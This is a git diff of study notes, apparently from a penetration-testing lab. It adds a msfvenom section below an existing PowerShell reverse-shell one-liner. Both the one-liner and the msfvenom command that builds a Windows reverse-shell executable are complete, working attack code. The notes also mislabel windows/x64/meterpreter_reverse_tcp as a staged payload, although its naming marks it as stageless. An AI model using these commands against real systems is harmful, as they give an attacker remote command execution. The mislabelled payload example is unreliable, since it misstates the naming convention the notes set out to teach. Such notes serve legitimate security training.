@@ -104,3 +104,23 @@ You can encrypt your shell with socat
 * Windows PowerShell
     * Reverse Shell
         * powershell -c "$client = New-Object System.Net.Sockets.TCPClient('[remote_ip]',[remote_port]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# Task 9 - msfvenom
+Payloads
+* Basic syntax: msfvenom -p [payload] [options]
+* Example for Windows x64 reverse shell
+    * msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=[local_ip] LPORT=[local_port]
+        * -f - output format
+        * -o - output file
+        * LHOST - IP that you want the payload to connect to
+        * LPORT - port that LHOST is listening on
+* Staged vs Stageless
+    * Staged - two parts, one - a stager whose job is to transfer the payload, two - a payload that contains code that will execute on the target to build the shell
+    * Stageless - one piece of code that when executed builds the shell
+* Meterpreter
+    * Stable
+    * Full featured
+    * Must be used in Metasploit
+* Naming convention : OS/ARCH/PAYLOAD
+* Staged Example : windows/x64/meterpreter_reverse_tcp
+* Stageless Example : linux/x86/shell_reverse_tcp
